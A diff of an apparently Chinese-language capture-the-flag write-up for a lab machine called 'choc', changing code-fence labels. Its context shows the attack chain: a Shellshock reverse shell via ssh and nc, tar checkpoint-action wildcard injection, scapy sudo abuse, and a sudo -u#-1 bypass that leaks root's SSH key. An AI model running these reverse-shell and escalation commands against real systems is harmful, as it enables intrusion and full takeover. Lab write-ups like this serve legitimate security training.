@@ -57,7 +57,7 @@ PORT   STATE SERVICE VERSION
 
 ## ftp 匿名登陆
 
-```shell
+```bash
 ftp> ls -lah
 drwxr-xr-x    2 0        114          4096 Apr 20  2021 .
 drwxr-xr-x    2 0        114          4096 Apr 20  2021 ..
@@ -72,7 +72,7 @@ carl@choc
 
 ## User - carl
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ ssh carl@192.168.56.122 -i id_rsa
 
@@ -107,14 +107,14 @@ Connection to 192.168.56.122 closed.
 
 参考直接执行反弹 shell
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ ssh carl@192.168.56.122 -i id_rsa '() { :;}; nc 192.168.56.102 9999 -e /bin/bash'
 ```
 
 ## User - carl
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 9999
 [13:19:31] Welcome to pwncat 🐈!
@@ -151,7 +151,7 @@ The human doesn't exist yet and that's fucking great!!! but I'm a little bored..
 
 同时尝试探测有哪些文件的所有者是 `torki`
 
-```shell title="find / -user torki 2>/dev/null"
+```bash title="find / -user torki 2>/dev/null"
 /home/torki
 /home/torki/.profile
 /home/torki/.selected_editor
@@ -171,7 +171,7 @@ The human doesn't exist yet and that's fucking great!!! but I'm a little bored..
 
 ## 借助 tar 进行提权
 
-```shell
+```bash
 (remote) carl@choc:/home/torki$ echo '' > secret_garden/--checkpoint=1
 (remote) carl@choc:/home/torki$ echo ''>'secret_garden/--checkpoint-action=exec=sh pwn.sh'
 (remote) carl@choc:/home/torki$ echo 'nc 192.168.56.102 8888 -e /bin/bash' > secret_garden/pwn.sh
@@ -182,7 +182,7 @@ The human doesn't exist yet and that's fucking great!!! but I'm a little bored..
 
 ## User - torki
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 8888
 [23:57:42] Welcome to pwncat 🐈!
@@ -205,7 +205,7 @@ scapy 就是一个 Python 环境，所以很容易就能实现横向越权
 
 ## User - sarah
 
-```shell
+```bash
 (remote) torki@choc:/home/torki/secret_garden$ sudo -u sarah /usr/bin/scapy
 WARNING: Cannot read wireshark manuf database
 INFO: Can't import matplotlib. Won't be able to plot.
@@ -243,7 +243,7 @@ sarah
 
 ### flag - user
 
-```shell
+```bash
 sarah@choc:~$ cat user.txt
 commenquaded
 ```
@@ -273,7 +273,7 @@ fuckmeplease
 
 ### sudo 版本可导致绕过
 
-```shell
+```bash
 sarah@choc:/home/torki/.ssh$ sudo --version
 Sudo version 1.8.23
 Sudoers policy plugin version 1.8.23
@@ -294,7 +294,7 @@ User sarah may run the following commands on choc:
 
 :::
 
-```shell
+```bash
 sarah@choc:/home/torki/.ssh$ sudo -u#-1 /usr/bin/wall --nobanner /root/.ssh/id_rsa
 ```
 
@@ -332,7 +332,7 @@ gskjOtELMuhigHo7AAAACXJvb3RAY2hvYwE=
 
 ## User - root
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $ ssh -i root_id_rsa root@192.168.56.122
 
@@ -360,7 +360,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 root@choc:~# cat r00t.txt
 inesbywal
 ```
